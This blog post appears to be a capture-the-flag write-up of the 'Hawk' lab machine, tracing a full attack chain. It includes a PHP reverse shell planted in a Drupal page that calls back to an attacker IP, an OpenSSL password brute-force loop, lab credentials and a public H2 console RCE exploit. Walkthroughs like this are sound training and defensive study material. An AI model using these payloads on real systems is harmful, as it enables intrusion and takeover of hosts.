---
layout: post
title: "hawk"
date: 2025-09-20 
categories: OSCP Playlist
---
# hawk

# Summary

- ftp allow anon login to get openssl encrypted text
- bruteforce-salted-openssl with aes-256-cbc method to find potential passwords
- decrypted text reveal credential to login to drupal
- created basic page with php reverse shell to get foothold
- settings.php reveal mysql password, which was reused to login to daniel
- ss -lntp reveal port 8082 which runs h2 app, and ps shows h2 ran by root
- h2 unauthenticated RCE to get root

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/hawk 10.10.10.102

21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.16.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Drupal 7 (http://drupal.org)
8082/tcp open  http    H2 database http console
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Let’s check out the fpt server, since anon login is allowed:

```bash
ftp 10.10.10.102

ls -la 

get .drupal.txt.enc
```

The content of .drupal.txt.enc:

```bash
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
```

It looks like base64 encoding. Let’s decode:

```bash
echo 'U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJbCmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQzQUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfyt4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=' | base64 -d > drupal_enc.txt

Salted__kY ԓi-6l7Z>{$p5 2[ <SNNIP>
```

This seems to be encrypted with openssl with a pass key. 

Counting the number of characters in the encrypted text, we know it’s a block cipher since it’s divisible by 8:

```bash
wc -c drupal_enc.txt

176
```

```bash
cat /usr/share/wordlists/rockyou.txt | while read pass; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; fi; done;

friends
<SNIP>
```

- `a` - base64 encoded content
- `AES-256-CBC` - most common encryption method
- `k $pass` - password to decrypt with
- try out the passwords outputted.

```bash
openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k friends

Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
              
```

Another way is to use the tool bruteforce-salted-openssl:

```bash
bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 drupal_enc.txt

Tried passwords: 21
Tried passwords per second: inf
Last tried password: loveme

Password candidate: friends

```

- `-d` as the default digest for openssl is sha256

Let’s move on to port 80 first:

![image.png]({{ site.baseurl }}/assets/hawk/image.png)

We get a drupal application.

Let’s use droopescan to get more information:

```bash
droopescan scan drupal -u http://10.10.10.102

[+] Plugins found:                                                              
    profile http://10.10.10.102/modules/profile/
    php http://10.10.10.102/modules/php/
    image http://10.10.10.102/modules/image/

[+] Themes found:
    seven http://10.10.10.102/themes/seven/
    garland http://10.10.10.102/themes/garland/

[+] Possible version(s):
    7.58

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.102/CHANGELOG.txt
    Default admin - http://10.10.10.102/user/login

[+] Scan finished (0:01:08.041510 elapsed)

```

The version of drupal is 7.58, which is not exploitable by drupalgeddon2. 

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.102/FUZZ -ic

misc                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 43ms]
0                       [Status: 200, Size: 7464, Words: 805, Lines: 157, Duration: 97ms]
user                    [Status: 200, Size: 7297, Words: 755, Lines: 150, Duration: 95ms]
themes                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 29ms]
modules                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 64ms]
admin                   [Status: 403, Size: 7551, Words: 803, Lines: 160, Duration: 106ms]
scripts                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 32ms]
node                    [Status: 200, Size: 7464, Words: 805, Lines: 157, Duration: 133ms]
sites                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 25ms]
Search                  [Status: 403, Size: 7398, Words: 800, Lines: 157, Duration: 196ms]
includes                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 42ms]
search                  [Status: 403, Size: 7398, Words: 800, Lines: 157, Duration: 6335ms]
                        [Status: 200, Size: 7464, Words: 805, Lines: 157, Duration: 6643ms]
profiles                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 22ms]
README                  [Status: 200, Size: 5382, Words: 684, Lines: 124, Duration: 34ms]
robots                  [Status: 200, Size: 2189, Words: 158, Lines: 91, Duration: 25ms]
INSTALL                 [Status: 200, Size: 17995, Words: 2955, Lines: 401, Duration: 23ms]
LICENSE                 [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 334ms]
User                    [Status: 200, Size: 8940, Words: 901, Lines: 173, Duration: 549ms]
Admin                   [Status: 403, Size: 7393, Words: 800, Lines: 157, Duration: 516ms]
Template                [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 75ms]
CHANGELOG               [Status: 200, Size: 111859, Words: 17350, Lines: 2313, Duration: 461ms]
COPYRIGHT               [Status: 200, Size: 1481, Words: 221, Lines: 45, Duration: 58ms]
batch                   [Status: 403, Size: 7686, Words: 819, Lines: 161, Duration: 1143ms]
SEARCH                  [Status: 403, Size: 7398, Words: 800, Lines: 157, Duration: 392ms]
Repository              [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 45ms]

```

We can also confirm the version from CHANGELOG:

![image.png]({{ site.baseurl }}/assets/hawk/image%201.png)

Let’s login with the credential we got before:

```bash
admin:PencilKeyboardScanner123
```

Since this is version before drupal 8, we can enable the php module, so we can create a php reverse shell in a basic page later. Let’s do the first step first:

Go to Modules and tick PHP filter:

![image.png]({{ site.baseurl }}/assets/hawk/image%202.png)

After it’s enabled, we need to go to the right hand side of PHP filter, click on permissions, enable PHP code:

![image.png]({{ site.baseurl }}/assets/hawk/image%203.png)

![image.png]({{ site.baseurl }}/assets/hawk/image%204.png)

And save the configuration.

Now let’s create our basic page with reverse shell:

Create a basic page with content:

```bash
<?php

$sock=fsockopen("10.10.16.7",4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);

?>
```

![image.png]({{ site.baseurl }}/assets/hawk/image%205.png)

And start a listener before clicking save:

```bash
nc -lvnp 4444
```

We now have shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png]({{ site.baseurl }}/assets/hawk/image%206.png)

Executing linpeas on the target, we find:

```bash
╔══════════╣ Searching passwords in config PHP files                                                                                                     
/var/www/html/sites/default/settings.php:      'password' => 'drupal4hawk',                                                                              

```

Viewing the file more closely:

```bash
$databases = array (                                                                                                                                     
  'default' =>                                                                                                                                           
  array (                                                                                                                                                
    'default' =>                                                                                                                                         
    array (                                                                 
      'database' => 'drupal',                                               
      'username' => 'drupal',                                                                                                                            
      'password' => 'drupal4hawk',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',    
      'prefix' => '',    
    ),               
  ),          
);

```

It’s a mysql login. Let’s try loggin in:

```bash
mysql -h localhost -u drupal -p
```

We are in:

```bash
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| drupal             |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

use drupal;

show tables;

select * from users;

admin:$S$DFw163ixD00W55hdCqtvCB13XOTLhZ0pt0FVpFy1Ntmdp5EAOX08

```

Since we already have admin’s password, this is not too useful. Let’s see if the mysql password is reused with daniel. 

```bash
ssh daniel@10.10.10.102
#drupal4hawk
```

It worked, but we seem to have a python interpreter shell:

![image.png]({{ site.baseurl }}/assets/hawk/image%207.png)

Let’s just try spawning a shell:

```bash
import pty; pty.spawn("/bin/bash")
```

We are in:

![image.png]({{ site.baseurl }}/assets/hawk/image%208.png)

Enumerating through privileges did not yield any more results.

Looking at the open ports:

```bash
ss -lntp

State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         50                        *:9092                   *:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         50                        *:8082                   *:*       
LISTEN   0         32                        *:21                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*       
LISTEN   0         50                        *:5435                   *:* 
```

Let’s check out port 8082, we remember from out nmap scan.

H2Console (often stylized as H2 Console) is the browser-based graphical user interface (GUI) for the H2 Database Engine, an open-source, lightweight relational database management system (RDBMS) written in Java. It provides a web interface for executing SQL queries, browsing database contents, and managing tables, making it a convenient tool for development, testing, and debugging.

When we visit port 8082:

![image.png]({{ site.baseurl }}/assets/hawk/image%209.png)

we cannot.

Let’s also resize the terminal so we can see all the running processes:

```bash
#on attack box
stty -a
speed 38400 baud; rows 38; columns 153; line = 0;

#on target
stty rows 38 cols 153
```

Now view the running processes:

```bash
ps -ef --forest

root       753     1  0 11:30 ?        00:00:00 /usr/sbin/cron -f
root       758   753  0 11:30 ?        00:00:00  \_ /usr/sbin/CRON -f
root       767   758  0 11:30 ?        00:00:00      \_ /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
root       768   767  0 11:30 ?        00:00:12          \_ /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar

```

Seems like h2 is ran by a cron job.

Let’s local port forward that to our host:

```bash
ssh daniel@10.10.10.102 -L 1234:localhost:8082 
```

Now we can visit the site on our localhost:

![image.png]({{ site.baseurl }}/assets/hawk/image%2010.png)

Searching up h2 exploit, we find this:

https://www.exploit-db.com/exploits/45506

![image.png]({{ site.baseurl }}/assets/hawk/image%2011.png)

Let’s copy the exploit and execute it on target system:

```bash
nano exploit.py

#copy and paste in the code
#now execute it
python3 exploit.py 127.0.0.1:8082
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/hawk/image%2012.png)

If the exploit did not work, we could’ve followed this manually:

https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html